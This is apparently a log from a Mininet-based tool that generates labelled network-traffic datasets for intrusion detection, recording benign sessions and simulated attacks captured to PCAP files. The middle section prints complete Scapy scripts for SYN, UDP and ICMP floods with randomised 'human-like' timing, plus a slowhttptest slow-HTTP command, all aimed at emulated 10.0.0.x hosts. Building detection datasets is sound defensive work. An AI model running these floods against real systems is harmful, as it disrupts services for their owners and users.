+2025-07-13 20:56:51,063 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;https_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=36286, dport=443, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'d43c36ef55bfea670acc595af363e7ae9d12d093663d38ce083f40c5ca143c4ff302a037af05fd6775c800f139a93530be508db1401346d779d6bc1e07c6d4b22c1b83dc9037ef6159510ce81edf57f23dd00b729bdaa3f786a9f9a28169da498e8bc6910b39871b61857fd0ecca0e9dba24ebf445b0f2709637ef80afa41c1620fd87c7b325357fb6b3f5a2290ef8310e2b65f55170c57764bfc041a8d8000c2cc9ccc8a1e95837a490af6e4595fae1731b4db8215f85fcde49212d1c6d16cc038bd213885ac04e758772561044b4a4bd8d2c25a9f2831d0c8c76b7cd66e5900ade597be945dde9dd30af6962c23191d5ac0ebc1d41b278fc1d1b31f01da51740c21ad6bf70198fdd16cb23f6d2db93a7e46218d0284b9211495ad583775d669146c18363427e8d49f23a082d2e71dcc32fd4f1dc654a7dfb545314db49996712b966335c0796c4c9ffee71f847cd75e679b89ab2d62f1a2c34ed13685519a8c879ad7dc20f31c8546194760c1cebd7ff2d77bbe541d6cbd1dcccb19cde4962434b395d63610b1556186b4d55bee6bdad13e04cf1c198f23af088e6a90b94a69db1bbd3e0a258e7ff6f53b7763e73214715c03c7cb6af315434ae1ff99a83983f7e42382b7600bdb7dded223961b8c257f531f644d33516a0c7741c8df8bfd450bcd636acf9637fba001f9adcc6bd50cfa5d25f6be8abb6c0194d3e64fdff6530526ee436a6beed2a8fd59c559b2597f31fa92b0aca4e04cec0ed49489a6f426e71ab9f8db16800f47bbc9d9ee693386d26aa7fb9f41884ff19aac3c245e25a1b75333631fa842bcf7c6082e6305bb0d2406cec5a068f7f850436168c\')); sendp(https_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:51,124 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:51,694 - mininet - DEBUG - 
+2025-07-13 20:56:51,694 - BENIGN - DEBUG - Generated HTTPS data traffic from h3:36286 -> h5:443 [content='Encrypted Application Data'] [Session 23] [len=659B]
+2025-07-13 20:56:51,694 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=443, dport=443, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:51,755 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:52,308 - mininet - DEBUG - 
+2025-07-13 20:56:52,309 - BENIGN - DEBUG - Generated HTTPS ACK reply from h5:443 <- h3:36286 [len=54B]
+2025-07-13 20:56:52,309 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;dns_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/UDP(sport=60900, dport=53)/DNS(rd=1, qd=DNSQR(qname=\'example.com\')); sendp(dns_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:52,370 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:52,958 - mininet - DEBUG - 
+2025-07-13 20:56:52,958 - BENIGN - DEBUG - Generated DNS query from h3:60900 -> h5:53 [qname='example.com'] [Session 24] [len=71B]
+2025-07-13 20:56:53,064 - BENIGN - [32mINFO[0m - Benign traffic finished.
+2025-07-13 20:56:53,064 - BENIGN - [32mINFO[0m - Summary: 24 protocol sessions [ICMP, TCP, UDP, Telnet, SSH, FTP, HTTP, HTTPS, DNS], 102 packets sent.
+2025-07-13 20:56:53,153 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting packet capture. Output file: /home/user/Desktop/dataset_generation/test_output/syn_flood.pcap
+2025-07-13 20:56:53,153 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Capturing on switch s1 interface any
+2025-07-13 20:56:53,153 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting tcpdump with command: tcpdump -i any -w /home/user/Desktop/dataset_generation/test_output/syn_flood.pcap -s 0 ip and not ip6 and net 10.0.0.0/8
+2025-07-13 20:56:53,159 - mininet - DEBUG - _popen ['mnexec', '-da', '45871', 'tcpdump', '-i', 'any', '-w', '/home/user/Desktop/dataset_generation/test_output/syn_flood.pcap', '-s', '0', 'ip', 'and', 'not', 'ip6', 'and', 'net', '10.0.0.0/8'] 46502
+2025-07-13 20:56:55,167 - src.utils.enhanced_pcap_processing - [32mINFO[0m - tcpdump started successfully with PID: 46502
+2025-07-13 20:57:01,320 - mininet - DEBUG - _popen ['mnexec', '-da', '45856', 'python3', '-c', "\nimport time\nimport random\nfrom scapy.all import *\n\ndef enhanced_syn_flood():\n    interface = 'h1-eth0'\n    target_ip = '10.0.0.6'\n    target_port = 80\n    \n    # Human-like timing variations\n    typing_intervals = [0.08, 0.12, 0.15, 0.09, 0.11, 0.13, 0.10, 0.14]\n    \n    packet_count = 0\n    while True:\n        try:\n            # Create SYN packet with protocol compliance\n            src_port = random.randint(32768, 65535)  # Ephemeral port range\n            seq_num = random.randint(0, 2**32 - 1)  # Random ISN\n            window_size = random.choice([8192, 16384, 32768, 65535])  # Realistic window sizes\n            \n            # Create TCP SYN packet with proper options\n            packet = Ether()/IP(dst=target_ip)/TCP(\n                sport=src_port,\n                dport=target_port,\n                seq=seq_num,\n                flags='S',\n                window=window_size,\n                options=[\n                    ('MSS', random.choice([1460, 1440, 536])),\n                    ('WScale', random.choice([0, 1, 2, 3, 4])),\n                    ('Timestamp', (random.randint(0, 2**32-1), 0)),\n                    ('SAckOK', '')\n                ]\n            )\n            \n            sendp(packet, iface=interface, verbose=0)\n            packet_count += 1\n            \n            # Apply human-like timing with variations\n            if packet_count % 50 == 0:  # Occasional think time\n                think_time = random.uniform(0.5, 2.0)\n                time.sleep(think_time)\n            else:\n                # Use typing-like intervals with network delay simulation\n                interval = random.choice(typing_intervals) * random.uniform(0.8, 1.2)\n                # Add network congestion simulation\n                if random.random() < 0.05:  # 5% chance of congestion\n                    interval *= random.uniform(2.0, 4.0)\n                time.sleep(max(0.005, interval))\n        \n        except Exception as e:\n            break\n\nenhanced_syn_flood()\n"] 46503
+2025-07-13 20:57:02,777 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting packet capture. Output file: /home/user/Desktop/dataset_generation/test_output/udp_flood.pcap
+2025-07-13 20:57:02,777 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Capturing on switch s1 interface any
+2025-07-13 20:57:02,777 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting tcpdump with command: tcpdump -i any -w /home/user/Desktop/dataset_generation/test_output/udp_flood.pcap -s 0 ip and not ip6 and net 10.0.0.0/8
+2025-07-13 20:57:02,783 - mininet - DEBUG - _popen ['mnexec', '-da', '45871', 'tcpdump', '-i', 'any', '-w', '/home/user/Desktop/dataset_generation/test_output/udp_flood.pcap', '-s', '0', 'ip', 'and', 'not', 'ip6', 'and', 'net', '10.0.0.0/8'] 46507
+2025-07-13 20:57:04,786 - src.utils.enhanced_pcap_processing - [32mINFO[0m - tcpdump started successfully with PID: 46507
+2025-07-13 20:57:06,802 - mininet - DEBUG - _popen ['mnexec', '-da', '45858', 'python3', '-c', "\nimport time\nimport random\nfrom scapy.all import *\n\ndef enhanced_udp_flood():\n    interface = 'h2-eth0'\n    target_ip = '10.0.0.4'\n    target_port = 53  # DNS\n    \n    # Human-like timing variations\n    typing_intervals = [0.08, 0.12, 0.15, 0.09, 0.11, 0.13, 0.10, 0.14]\n    \n    # DNS service patterns for realistic payloads\n    dns_payloads = [\n        b'\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07example\\x03com\\x00\\x00\\x01\\x00\\x01',\n        b'\\xab\\xcd\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x06google\\x03com\\x00\\x00\\x01\\x00\\x01',\n        b'\\xef\\x12\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x09localhost\\x00\\x00\\x01\\x00\\x01'\n    ]\n    \n    packet_count = 0\n    while True:\n        try:\n            # Create UDP packet with protocol compliance\n            src_port = random.randint(32768, 65535)  # Ephemeral port range\n            payload = random.choice(dns_payloads)  # Realistic DNS payload\n            \n            packet = Ether()/IP(dst=target_ip)/UDP(sport=src_port, dport=target_port)/Raw(load=payload)\n            sendp(packet, iface=interface, verbose=0)\n            \n            packet_count += 1\n            \n            # Apply human-like timing with variations\n            if packet_count % 50 == 0:  # Occasional think time\n                think_time = random.uniform(0.5, 2.0)\n                time.sleep(think_time)\n            else:\n                # Use typing-like intervals with network delay simulation\n                interval = random.choice(typing_intervals) * random.uniform(0.8, 1.2)\n                # Add network congestion simulation\n                if random.random() < 0.05:  # 5% chance of congestion\n                    interval *= random.uniform(2.0, 4.0)\n                time.sleep(max(0.005, interval))\n        \n        except Exception as e:\n            break\n\nenhanced_udp_flood()\n"] 46508
+2025-07-13 20:57:12,420 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting packet capture. Output file: /home/user/Desktop/dataset_generation/test_output/icmp_flood.pcap
+2025-07-13 20:57:12,421 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Capturing on switch s1 interface any
+2025-07-13 20:57:12,421 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting tcpdump with command: tcpdump -i any -w /home/user/Desktop/dataset_generation/test_output/icmp_flood.pcap -s 0 ip and not ip6 and net 10.0.0.0/8
+2025-07-13 20:57:12,426 - mininet - DEBUG - _popen ['mnexec', '-da', '45871', 'tcpdump', '-i', 'any', '-w', '/home/user/Desktop/dataset_generation/test_output/icmp_flood.pcap', '-s', '0', 'ip', 'and', 'not', 'ip6', 'and', 'net', '10.0.0.0/8'] 46512
+2025-07-13 20:57:14,431 - src.utils.enhanced_pcap_processing - [32mINFO[0m - tcpdump started successfully with PID: 46512
+2025-07-13 20:57:18,495 - mininet - DEBUG - _popen ['mnexec', '-da', '45858', 'python3', '-c', "\nimport time\nimport random\nfrom scapy.all import *\n\ndef enhanced_icmp_flood():\n    interface = 'h2-eth0'\n    target_ip = '10.0.0.4'\n    base_interval = 0.01\n    \n    # Human-like timing variations\n    typing_intervals = [0.08, 0.12, 0.15, 0.09, 0.11, 0.13, 0.10, 0.14]\n    \n    packet_count = 0\n    while True:\n        try:\n            # Create ICMP packet with slight variations\n            icmp_id = random.randint(1, 65535)\n            icmp_seq = packet_count % 65536\n            \n            packet = Ether()/IP(dst=target_ip)/ICMP(id=icmp_id, seq=icmp_seq)\n            sendp(packet, iface=interface, verbose=0)\n            \n            packet_count += 1\n            \n            # Apply human-like timing with variations\n            if packet_count % 50 == 0:  # Occasional think time\n                think_time = random.uniform(0.5, 2.0)\n                time.sleep(think_time)\n            else:\n                # Use typing-like intervals with network delay simulation\n                interval = random.choice(typing_intervals) * random.uniform(0.8, 1.2)\n                # Add network congestion simulation\n                if random.random() < 0.05:  # 5% chance of congestion\n                    interval *= random.uniform(2.0, 4.0)\n                time.sleep(max(0.005, interval))\n        \n        except Exception as e:\n            break\n\nenhanced_icmp_flood()\n"] 46513
+2025-07-13 20:57:22,033 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting packet capture. Output file: /home/user/Desktop/dataset_generation/test_output/ad_syn.pcap
+2025-07-13 20:57:22,034 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Capturing on switch s1 interface any
+2025-07-13 20:57:22,034 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting tcpdump with command: tcpdump -i any -w /home/user/Desktop/dataset_generation/test_output/ad_syn.pcap -s 0 ip and not ip6 and net 10.0.0.0/8
+2025-07-13 20:57:22,039 - mininet - DEBUG - _popen ['mnexec', '-da', '45871', 'tcpdump', '-i', 'any', '-w', '/home/user/Desktop/dataset_generation/test_output/ad_syn.pcap', '-s', '0', 'ip', 'and', 'not', 'ip6', 'and', 'net', '10.0.0.0/8'] 46518
+2025-07-13 20:57:24,042 - src.utils.enhanced_pcap_processing - [32mINFO[0m - tcpdump started successfully with PID: 46518
+2025-07-13 21:08:15,864 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting packet capture. Output file: /home/user/Desktop/dataset_generation/test_output/ad_udp.pcap
+2025-07-13 21:08:15,865 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Capturing on switch s1 interface any
+2025-07-13 21:08:15,865 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting tcpdump with command: tcpdump -i any -w /home/user/Desktop/dataset_generation/test_output/ad_udp.pcap -s 0 ip and not ip6 and net 10.0.0.0/8
+2025-07-13 21:08:15,880 - mininet - DEBUG - _popen ['mnexec', '-da', '45871', 'tcpdump', '-i', 'any', '-w', '/home/user/Desktop/dataset_generation/test_output/ad_udp.pcap', '-s', '0', 'ip', 'and', 'not', 'ip6', 'and', 'net', '10.0.0.0/8'] 46550
+2025-07-13 21:08:17,884 - src.utils.enhanced_pcap_processing - [32mINFO[0m - tcpdump started successfully with PID: 46550
+2025-07-13 21:11:43,955 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting packet capture. Output file: /home/user/Desktop/dataset_generation/test_output/ad_slow.pcap
+2025-07-13 21:11:43,955 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Capturing on switch s1 interface any
+2025-07-13 21:11:43,955 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Starting tcpdump with command: tcpdump -i any -w /home/user/Desktop/dataset_generation/test_output/ad_slow.pcap -s 0 ip and not ip6 and net 10.0.0.0/8
+2025-07-13 21:11:43,972 - mininet - DEBUG - _popen ['mnexec', '-da', '45871', 'tcpdump', '-i', 'any', '-w', '/home/user/Desktop/dataset_generation/test_output/ad_slow.pcap', '-s', '0', 'ip', 'and', 'not', 'ip6', 'and', 'net', '10.0.0.0/8'] 46556
+2025-07-13 21:11:45,976 - src.utils.enhanced_pcap_processing - [32mINFO[0m - tcpdump started successfully with PID: 46556
+2025-07-13 21:11:47,996 - mininet - DEBUG - _popen ['mnexec', '-da', '45866', '/bin/bash', '-c', 'python3 -m http.server 80 --bind 10.0.0.6'] 46557
+2025-07-13 21:11:49,017 - mininet - DEBUG - _popen ['mnexec', '-da', '45858', '/bin/bash', '-c', 'slowhttptest -c 100 -H -i 10 -r 20 -l 5 -u http://10.0.0.6:80/ -t SR'] 46558
+2025-07-13 21:12:01,169 - MAIN - [32mINFO[0m - PCAP generation complete.
+2025-07-13 21:12:01,169 - MAIN - [32mINFO[0m - Processing normal.pcap with label 'normal'...
+2025-07-13 21:12:01,170 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Verifying integrity of PCAP file: /home/user/Desktop/dataset_generation/test_output/normal.pcap
+2025-07-13 21:12:01,251 - src.utils.enhanced_pcap_processing - [32mINFO[0m - PCAP integrity check passed. Found 400 packets.
+2025-07-13 21:12:01,252 - MAIN - [32mINFO[0m - PCAP integrity check passed for test_output/normal.pcap: 400 packets
+2025-07-13 21:12:01,252 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Skipping timestamp validation as tcpdump is used.
+2025-07-13 21:12:01,333 - MAIN - [32mINFO[0m - Using baseline timestamp for labeling test_output/normal.pcap: 1752411352.962980
+2025-07-13 21:12:01,333 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Passing PCAP to processing function.
+2025-07-13 21:12:01,461 - MAIN - [32mINFO[0m - Processing syn_flood.pcap with label 'syn_flood'...
+2025-07-13 21:12:01,461 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Verifying integrity of PCAP file: /home/user/Desktop/dataset_generation/test_output/syn_flood.pcap
+2025-07-13 21:12:01,464 - src.utils.enhanced_pcap_processing - [32mINFO[0m - PCAP integrity check passed. Found 9 packets.
+2025-07-13 21:12:01,464 - MAIN - [32mINFO[0m - PCAP integrity check passed for test_output/syn_flood.pcap: 9 packets
+2025-07-13 21:12:01,464 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Skipping timestamp validation as tcpdump is used.
+2025-07-13 21:12:01,466 - MAIN - [32mINFO[0m - Using baseline timestamp for labeling test_output/syn_flood.pcap: 1752411419.304518
+2025-07-13 21:12:01,466 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Passing PCAP to processing function.
+2025-07-13 21:12:01,472 - MAIN - [32mINFO[0m - Processing udp_flood.pcap with label 'udp_flood'...
+2025-07-13 21:12:01,472 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Verifying integrity of PCAP file: /home/user/Desktop/dataset_generation/test_output/udp_flood.pcap
+2025-07-13 21:12:01,501 - src.utils.enhanced_pcap_processing - [32mINFO[0m - PCAP integrity check passed. Found 66 packets.
+2025-07-13 21:12:01,501 - MAIN - [32mINFO[0m - PCAP integrity check passed for test_output/udp_flood.pcap: 66 packets
+2025-07-13 21:12:01,501 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Skipping timestamp validation as tcpdump is used.
+2025-07-13 21:12:01,529 - MAIN - [32mINFO[0m - Using baseline timestamp for labeling test_output/udp_flood.pcap: 1752411427.367688
+2025-07-13 21:12:01,530 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Passing PCAP to processing function.
+2025-07-13 21:12:01,569 - MAIN - [32mINFO[0m - Processing icmp_flood.pcap with label 'icmp_flood'...
+2025-07-13 21:12:01,569 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Verifying integrity of PCAP file: /home/user/Desktop/dataset_generation/test_output/icmp_flood.pcap
+2025-07-13 21:12:01,577 - src.utils.enhanced_pcap_processing - [32mINFO[0m - PCAP integrity check passed. Found 36 packets.
+2025-07-13 21:12:01,577 - MAIN - [32mINFO[0m - PCAP integrity check passed for test_output/icmp_flood.pcap: 36 packets
+2025-07-13 21:12:01,577 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Skipping timestamp validation as tcpdump is used.
+2025-07-13 21:12:01,585 - MAIN - [32mINFO[0m - Using baseline timestamp for labeling test_output/icmp_flood.pcap: 1752411439.054347
+2025-07-13 21:12:01,585 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Passing PCAP to processing function.
+2025-07-13 21:12:01,599 - MAIN - [32mINFO[0m - Processing ad_syn.pcap with label 'ad_syn'...
+2025-07-13 21:12:01,599 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Verifying integrity of PCAP file: /home/user/Desktop/dataset_generation/test_output/ad_syn.pcap
+2025-07-13 21:12:01,621 - src.utils.enhanced_pcap_processing - [32mINFO[0m - PCAP integrity check passed. Found 124 packets.
+2025-07-13 21:12:01,621 - MAIN - [32mINFO[0m - PCAP integrity check passed for test_output/ad_syn.pcap: 124 packets
+2025-07-13 21:12:01,621 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Skipping timestamp validation as tcpdump is used.
+2025-07-13 21:12:01,643 - MAIN - [32mINFO[0m - Using baseline timestamp for labeling test_output/ad_syn.pcap: 1752411448.152205
+2025-07-13 21:12:01,643 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Passing PCAP to processing function.
+2025-07-13 21:12:01,681 - MAIN - [32mINFO[0m - Processing ad_udp.pcap with label 'ad_udp'...
+2025-07-13 21:12:01,681 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Verifying integrity of PCAP file: /home/user/Desktop/dataset_generation/test_output/ad_udp.pcap
+2025-07-13 21:12:01,700 - src.utils.enhanced_pcap_processing - [32mINFO[0m - PCAP integrity check passed. Found 94 packets.
+2025-07-13 21:12:01,700 - MAIN - [32mINFO[0m - PCAP integrity check passed for test_output/ad_udp.pcap: 94 packets
+2025-07-13 21:12:01,701 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Skipping timestamp validation as tcpdump is used.
+2025-07-13 21:12:01,719 - MAIN - [32mINFO[0m - Using baseline timestamp for labeling test_output/ad_udp.pcap: 1752412099.889112
+2025-07-13 21:12:01,720 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Passing PCAP to processing function.
+2025-07-13 21:12:01,752 - MAIN - [32mINFO[0m - Processing ad_slow.pcap with label 'ad_slow'...
+2025-07-13 21:12:01,752 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Verifying integrity of PCAP file: /home/user/Desktop/dataset_generation/test_output/ad_slow.pcap
+2025-07-13 21:12:01,849 - src.utils.enhanced_pcap_processing - [32mINFO[0m - PCAP integrity check passed. Found 499 packets.
+2025-07-13 21:12:01,850 - MAIN - [32mINFO[0m - PCAP integrity check passed for test_output/ad_slow.pcap: 499 packets
+2025-07-13 21:12:01,850 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Skipping timestamp validation as tcpdump is used.
+2025-07-13 21:12:01,947 - MAIN - [32mINFO[0m - Using baseline timestamp for labeling test_output/ad_slow.pcap: 1752412309.020102
+2025-07-13 21:12:01,948 - src.utils.enhanced_pcap_processing - [32mINFO[0m - Passing PCAP to processing function.
+2025-07-13 21:12:02,114 - MAIN - [32mINFO[0m - Combined labeled CSV generated at: /home/user/Desktop/dataset_generation/test_output/packet_features.csv
+2025-07-13 21:12:02,115 - MAIN - [32mINFO[0m - Final combined CSV created successfully.
+2025-07-13 21:12:02,115 - MAIN - [32mINFO[0m - Flow-level dataset generated at: /home/user/Desktop/dataset_generation/test_output/flow_features.csv
+2025-07-13 21:12:02,115 - MAIN - [32mINFO[0m - Generating dataset summary...
+2025-07-13 21:12:02,184 - MAIN - [32mINFO[0m - Dataset generation summary displayed above
+2025-07-13 21:12:02,184 - MAIN - [32mINFO[0m - ============================================================
+2025-07-13 21:12:02,184 - MAIN - [32mINFO[0m - FINAL EXECUTION SUMMARY
+2025-07-13 21:12:02,184 - MAIN - [32mINFO[0m - ============================================================
+2025-07-13 21:12:02,184 - MAIN - [32mINFO[0m - Total Execution Time: 986.45 seconds (16.44 minutes | 0.27 hours)
+2025-07-13 21:12:02,184 - MAIN - [32mINFO[0m - Dataset Generation Complete: 2025-07-13 21:12:02
+2025-07-13 21:12:02,184 - MAIN - [32mINFO[0m - ============================================================
